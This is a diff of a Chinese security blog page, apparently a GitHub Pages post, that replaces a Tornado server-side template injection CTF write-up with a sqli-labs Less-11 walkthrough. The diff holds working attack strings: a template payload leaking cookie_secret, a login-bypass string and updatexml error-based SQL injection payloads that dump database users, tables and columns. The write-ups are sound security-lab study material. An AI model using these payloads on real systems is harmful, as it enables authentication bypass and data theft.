@@ -6,26 +6,26 @@
     
 
     
-    <title>服务端模板注入(SSTI)学习笔记 | 1eAder</title>
+    <title>sqli-labs-less11通关笔记 | 1eAder</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-        <meta name="keywords" content="SSTI" />
+        <meta name="keywords" content="sqli-labs" />
     
-    <meta name="description" content="#服务端模板注入(SSTI)学习笔记 我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。  So，模板注入这个东西的起因就是因为方便   ##如何造成的注入呢？ 学习Web安全的时候，有一条规则是大家公认的。 一切用户可控的值，都是不安全的 用这次护网杯的一道WEB题来了">
-<meta name="keywords" content="SSTI">
+    <meta name="description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-11)发现题目有一个登录框看到登陆框，就想到万能密码。 这里情况在实战中分为两种：1.万能密码登陆后台，登陆后找地方拿shell2.如果会报错，post报错注入拿数据库信息 万能密码其实万能密码归根结底，也是sql注入 先单引号测试下在username输入框输入一个单引号，password随便输入 可以看到报错了 报错点在a&amp;#39; L">
+<meta name="keywords" content="sqli-labs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="服务端模板注入(SSTI)学习笔记">
-<meta property="og:url" content="https://leaderzhang.github.io/2018/10/14/study-ssti/index.html">
+<meta property="og:title" content="sqli-labs-less11通关笔记">
+<meta property="og:url" content="https://leaderzhang.github.io/2018/10/26/sqli-labs-less11/index.html">
 <meta property="og:site_name" content="1eAder">
-<meta property="og:description" content="#服务端模板注入(SSTI)学习笔记 我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。  So，模板注入这个东西的起因就是因为方便   ##如何造成的注入呢？ 学习Web安全的时候，有一条规则是大家公认的。 一切用户可控的值，都是不安全的 用这次护网杯的一道WEB题来了">
+<meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-11)发现题目有一个登录框看到登陆框，就想到万能密码。 这里情况在实战中分为两种：1.万能密码登陆后台，登陆后找地方拿shell2.如果会报错，post报错注入拿数据库信息 万能密码其实万能密码归根结底，也是sql注入 先单引号测试下在username输入框输入一个单引号，password随便输入 可以看到报错了 报错点在a&amp;#39; L">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.imgur.com/XHpYuJE.png">
-<meta property="og:updated_time" content="2018-10-13T19:14:56.285Z">
+<meta property="og:image" content="https://i.imgur.com/C04keOA.png">
+<meta property="og:updated_time" content="2018-10-26T03:06:30.803Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="服务端模板注入(SSTI)学习笔记">
-<meta name="twitter:description" content="#服务端模板注入(SSTI)学习笔记 我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。  So，模板注入这个东西的起因就是因为方便   ##如何造成的注入呢？ 学习Web安全的时候，有一条规则是大家公认的。 一切用户可控的值，都是不安全的 用这次护网杯的一道WEB题来了">
-<meta name="twitter:image" content="https://i.imgur.com/XHpYuJE.png">
+<meta name="twitter:title" content="sqli-labs-less11通关笔记">
+<meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-11)发现题目有一个登录框看到登陆框，就想到万能密码。 这里情况在实战中分为两种：1.万能密码登陆后台，登陆后找地方拿shell2.如果会报错，post报错注入拿数据库信息 万能密码其实万能密码归根结底，也是sql注入 先单引号测试下在username输入框输入一个单引号，password随便输入 可以看到报错了 报错点在a&amp;#39; L">
+<meta name="twitter:image" content="https://i.imgur.com/C04keOA.png">
     
 
     
@@ -140,19 +140,19 @@
                         <div class="main-body-header">
     <h1 class="header">
     
-    <a class="page-title-link" href="/categories/WEB安全/">WEB安全</a>
+    <a class="page-title-link" href="/categories/sqli-labs/">sqli-labs</a>
     </h1>
 </div>
 
                         <div class="main-body-content">
-                            <article id="pages-study-ssti" class="article article-single article-type-pages" itemscope itemprop="blogPost">
+                            <article id="pages-sqli-labs-less11" class="article article-single article-type-pages" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        服务端模板注入(SSTI)学习笔记
+        sqli-labs-less11通关笔记
         </h1>
     
 
@@ -162,8 +162,8 @@
             <div class="article-meta">
                 
     <div class="article-date">
-        <a href="/2018/10/14/study-ssti/" class="article-date">
-            <time datetime="2018-10-13T19:02:55.000Z" itemprop="datePublished">2018-10-14</time>
+        <a href="/2018/10/26/sqli-labs-less11/" class="article-date">
+            <time datetime="2018-10-26T03:03:49.000Z" itemprop="datePublished">2018-10-26</time>
         </a>
     </div>
 
@@ -172,70 +172,40 @@
                 
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/SSTI/">SSTI</a>
+        <a class="tag-link" href="/tags/sqli-labs/">sqli-labs</a>
     </div>
 
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
-            <h2 id="服务端模板注入-SSTI-学习笔记"><a href="#服务端模板注入-SSTI-学习笔记" class="headerlink" title="#服务端模板注入(SSTI)学习笔记"></a>#服务端模板注入(SSTI)学习笔记</h2><ul>
-<li><p>我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。</p>
-</li>
-<li><p>So，模板注入这个东西的起因就是因为<strong>方便</strong></p>
-</li>
-</ul>
-<p>##如何造成的注入呢？</p>
-<p>学习Web安全的时候，有一条规则是大家公认的。</p>
-<p><strong>一切用户可控的值，都是不安全的</strong></p>
-<p>用这次护网杯的一道WEB题来了解SSTI</p>
-<blockquote>
-<p><strong>easy tornado</strong></p>
-</blockquote>
-<p>打开网站后，是这样的：<br><br><br><img src="https://i.imgur.com/XHpYuJE.png" alt="easy tornado"><br><br><br>依次打开链接后得到的信息：</p>
+            <h1 id="Sql注入学习笔记——基于Sqli-labs平台-Less-11"><a href="#Sql注入学习笔记——基于Sqli-labs平台-Less-11" class="headerlink" title="Sql注入学习笔记——基于Sqli-labs平台(Less-11)"></a>Sql注入学习笔记——基于Sqli-labs平台(Less-11)</h1><p>发现题目有一个登录框<br><img src="https://i.imgur.com/C04keOA.png" alt="关卡显示"><br>看到登陆框，就想到万能密码。</p>
+<p>这里情况在实战中分为两种：<br>1.万能密码登陆后台，登陆后找地方拿shell<br>2.如果会报错，post报错注入拿数据库信息</p>
+<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>其实万能密码归根结底，也是sql注入</p>
+<p>先单引号测试下<br>在username输入框输入一个单引号，password随便输入</p>
+<p>可以看到报错了<br><img src="https://i.imgur.com/HA0zjAr.png" alt="报错信息"></p>
+<p>报错点在<code>a&#39; LIMIT 0,1</code></p>
+<p>在password输入一个单引号，username随便输入</p>
+<p>发现也可以报错<br><img src="https://i.imgur.com/z5O7ThQ.png" alt="报错信息2"></p>
+<p>报错点在<code>&#39;&#39;&#39; LIMIT 0,1</code></p>
+<p>我是根据经验来猜测的。。</p>
+<p>后台语句应该为：<br><code>select * from users where username = &#39;$username&#39; and password = &#39;$password&#39; limit 0,1</code></p>
+<p>其实很好推断出来，先写好一个固定式:<br><code>select * from users where username = 未知  and password = 未知 limit 0,1</code></p>
+<p>再根据不同地方的单引号报错信息，推断出未知部分</p>
+<p>然后在username输入<code>&#39; or &#39;1&#39;=1#</code><br>password随便输入后</p>
+<p>可以看到，成功登陆了。。<br><img src="https://i.imgur.com/FMbcSXQ.png" alt="登陆成功"></p>
+<p>如果不想去构思payload的话，直接用万能密码进行爆破</p>
 <hr>
-<p>/file?filename=Orz.txt&amp;signature=0434ba1fadd43ce31661c315fbb8a9c6</p>
-<p>Orz.txt<br>render()</p>
-<hr>
-<p>/file?filename=hint.txt&amp;signature=78423a4ae34f2a6e9088a35ef650af22</p>
-<p>hint.txt<br>md5(cookie_secret + md5(filename))</p>
-<hr>
-<p>/file?filename=flag.txt&amp;signature=dbc862f7ca4cd3dd4ba82c6e7ff6d6af</p>
-<p>flag.txt<br>/fllllllllllag</p>
-<hr>
-<p>第一个Orz.txt提示render()</p>
-<p><strong>render()</strong>是一般python Web应用框架中渲染模板的函数<br>所以应该往SSTI方面想</p>
-<p>第二个hint.txt提示了一段加密算法<br>对题目基础测试的时候，会发现这一段加密算法应该就是signature的算法。</p>
-<p>第三个flag.txt提示了flag所在的文件</p>
-<p>我们随意读取一个文件时，他会报错，网页提示是签名错误<br><img src="https://i.imgur.com/qKRAWAV.png" alt="easy tornado提示签名错误"></p>
-<p>我们看到有一个msg的参数，对它Fuzz一波，可以发现，传的值会返回在页面上</p>
-<p><img src="https://i.imgur.com/awludzl.png" alt="fuzz参数"><br>所以想到第一个提示的render()的作用就应该在这里体现出来。</p>
-<p>由于是tornado框架，没怎么接触过，所以我们得去官网找一找关于模板引擎的<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#" target="_blank" rel="noopener">文档</a></p>
-<p>可以了解到，服务端在render()函数中传递参数的值的用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.render(&apos;index.html&apos;, contents=CONTENTS_LIST)</span><br></pre></td></tr></table></figure></p>
-<p>在html模板文件中接收值的用法：<img src="https://i.imgur.com/IC0YlrC.png" alt="模板中传递值的用法"></p>
-<p>表示在html中取服务端的CONTENTS_LIST的内容。</p>
-<p>接下来我们要想办法读取hint.txt里面加密算法的值</p>
-<p>filename对应url里面的filename值</p>
-<p>但是cookie_secret这个东西是什么？</p>
-<p>百度一波后知道，是tornado为了cookie的安全设置的一个值</p>
-<p>官方对Cookie_secret这个值的<a href="https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret" target="_blank" rel="noopener">解释文档</a></p>
-<p>我们可以看到，当MainHandler传递值时，会创建一个名叫settings的dict，而cookie_secret就在里面。并且，settings会随着MainHandler传递到前端去。这样我们就可以构造一个payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>我们就可以得到cookie_secret了<br><img src="https://i.imgur.com/NuSw6Nj.png" alt="tornado的cookie_secret"></p>
-<p>然后把它用hint.txt里面的加密算法带入进去计算一下。</p>
-<blockquote>
-<p>提示：由于cookie_secret里面有特殊字符，需要将特殊字符原封不动得带入</p>
-</blockquote>
-<p>python脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">cookie_secret=r&apos;WhzKS&#123;Z.*~k)L@XEt3UT%GB04(NAV[l1ojuD!-?]2Hg&lt;rx&#125;QmnCOpJ9+c8&gt;&amp;qI6s&apos;</span><br><span class="line"></span><br><span class="line">def md5(code):</span><br><span class="line">	temp = hashlib.md5(str(code)).hexdigest()</span><br><span class="line">	return temp</span><br><span class="line">filename = &apos;/fllllllllllag&apos;</span><br><span class="line">res = md5(cookie_secret + md5(filename))</span><br><span class="line">print res</span><br></pre></td></tr></table></figure>
-<p>其实这项漏洞很早就被发现，但为什么不能被广大利用呢？<br>因为这在真实的生产环境很少用到，在现在的网站中，已经很少有直接将用户的值直接显示在页面上的。一般都会将值实体化编码后再输入。</p>
-<p>推荐学习的链接：</p>
-<p><a href="https://wizardforcel.gitbooks.io/web-hacking-101/content/16.html" title="web-hacking-101中文版第十六章模板注入" target="_blank" rel="noopener">web-hacking-101中文版第十六章模板注入</a></p>
-<p><a href="https://portswigger.net/blog/server-side-template-injection" title="Burpsuite关于SSTI的用法和讲解" target="_blank" rel="noopener">Burpsuite关于SSTI的用法和讲解</a></p>
-<p><a href="http://www.4hou.com/technology/12675.html" title="服务器端模板注入(SSTI)" target="_blank" rel="noopener">服务器端模板注入(SSTI)</a></p>
-<p><a href="http://www.freebuf.com/articles/web/135953.html" title="服务端注入之Flask框架中服务端模板注入问题" target="_blank" rel="noopener">服务端注入之Flask框架中服务端模板注入问题</a></p>
-<p><a href="http://www.freebuf.com/articles/web/136118.html" title="Flask Jinja2开发中遇到的的服务端注入问题研究" target="_blank" rel="noopener">Flask Jinja2开发中遇到的的服务端注入问题研究</a></p>
-<p><a href="https://www.cnblogs.com/wfzWebSecuity/p/9415641.html" title="python 模板注入" target="_blank" rel="noopener">python 模板注入</a></p>
+<h2 id="POST登录框报错注入"><a href="#POST登录框报错注入" class="headerlink" title="POST登录框报错注入"></a>POST登录框报错注入</h2><p>由于这里会显示详细的报错信息，那么我们就利用报错注入来操作一下，跟前面的报错注入一样，只不过是将get改为post。而post的参数在url中是看不到的</p>
+<p>在username随便输入，password处输入<br>payload:</p>
+<p><code>&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</code><br><img src="https://i.imgur.com/Znyq902.png" alt="报错注入显示用户"></p>
+<p>查询表名：<br><img src="https://i.imgur.com/nTBs6R0.png" alt="报错查询表名"></p>
+<p>payload：<br><code>&#39; and (updatexml(1,concat(0x7e,((select table_name from information_schema.tables where table_schema=database() limit 0,1)),0x7e),1))#</code></p>
+<p>查询字段名：<br><img src="https://i.imgur.com/2PVjNmo.png" alt="报错注入查询字段名"></p>
+<p>payload:<br><code>&#39; and (updatexml(1,concat(0x7e,((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=database() limit 1,1)),0x7e),1))#</code></p>
+<p>查询内容：<br><img src="https://i.imgur.com/ybt3ZOM.png" alt="报错显示内容"></p>
+<p>payload:<br><code>&#39; and (updatexml(1,concat(0x7e,((select username from users limit 0,1)),0x7e),1))#</code></p>
+<p>ok，第十一关也完成了~</p>
 
         </div>
         <footer class="article-footer">
@@ -243,7 +213,7 @@
 
 
 
-    <a data-url="https://leaderzhang.github.io/2018/10/14/study-ssti/" data-id="cjnpfo2m9001130nuxce1z1fx" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="https://leaderzhang.github.io/2018/10/26/sqli-labs-less11/" data-id="cjnpfo2lt000530nudiyz35qp" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -381,20 +351,10 @@
         
 <nav id="article-nav">
     
-        <a href="/2018/10/15/DDCTF-WEB1-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">下一篇</strong>
-        <p class="article-nav-title">
-        
-            DDCTF WEB1 数据库的秘密
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
     
-    
-        <a href="/2018/10/12/how-to-bind-domain-with-github/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2018/10/26/sqli-labs-less10/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">上一篇</strong>
-        <p class="article-nav-title">怎样将域名绑定到github pages 博客上</p>
+        <p class="article-nav-title">sqli-labs-less10通关笔记</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -608,7 +568,7 @@
     var disqus_shortname = 'hexo-theme-hueman';
     
     
-    var disqus_url = 'https://leaderzhang.github.io/2018/10/14/study-ssti/';
+    var disqus_url = 'https://leaderzhang.github.io/2018/10/26/sqli-labs-less11/';
     
     (function() {
     var dsq = document.createElement('script');
